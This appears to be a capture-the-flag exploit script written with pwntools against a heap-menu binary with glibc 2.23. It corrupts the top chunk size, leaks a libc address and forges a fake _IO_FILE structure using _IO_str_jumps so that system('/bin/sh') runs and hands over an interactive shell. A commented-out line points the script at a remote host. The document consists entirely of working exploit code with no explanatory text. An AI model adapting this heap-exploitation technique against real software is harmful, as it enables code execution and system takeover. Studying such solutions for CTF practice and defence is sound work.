from pwn import*
def menu(ch):
	p.sendlineafter('>> ',str(ch))
def new(index,size,content):
	menu(1)
	p.sendlineafter(': ',str(index))
	p.sendlineafter('turbine: ',str(size))
	p.sendafter('name: ',content)
def show(index):
	menu(2)
	p.sendlineafter('viewed: ',str(index))
def edit(index,content):
	menu(3)
	p.sendlineafter('turbine: ',str(index))
	p.sendafter('input: ',content)
p = process('./main')
#p = remote('182.92.203.154',28452)
libc =ELF('./libc-2.23.so')
new(0,0x200,'\x00'*0x208 + p32(0xDF1))
new(1,0x1000,'FMYY')
new(2,0x100,'\xA0')
show(2)
libc_base = u64(p.recvuntil('\x7F')[-6:].ljust(8,'\x00')) - libc.sym['__malloc_hook']  - 0x70 - 0x620
log.info('LIBC:\t' + hex(libc_base))

IO_list_all = libc_base + libc.sym['_IO_list_all']
IO_str_jumps = libc_base + 0x3C37A0
fake_IO_FILE  = p64(0) + p64(0x61)
fake_IO_FILE += p64(0) + p64(IO_list_all - 0x10)
fake_IO_FILE += p64(0) + p64(1)
fake_IO_FILE += p64(0) + p64(libc_base + libc.search('/bin/sh').next())
fake_IO_FILE  = fake_IO_FILE.ljust(0xD8,'\x00')
fake_IO_FILE += p64(IO_str_jumps - 8)
fake_IO_FILE += p64(0) + p64(libc_base + libc.sym['system'])
new(3,0x200,'\x00'*0x200 + fake_IO_FILE)
menu(1)
p.sendline('4')
p.sendline(str(0x200))
p.interactive()
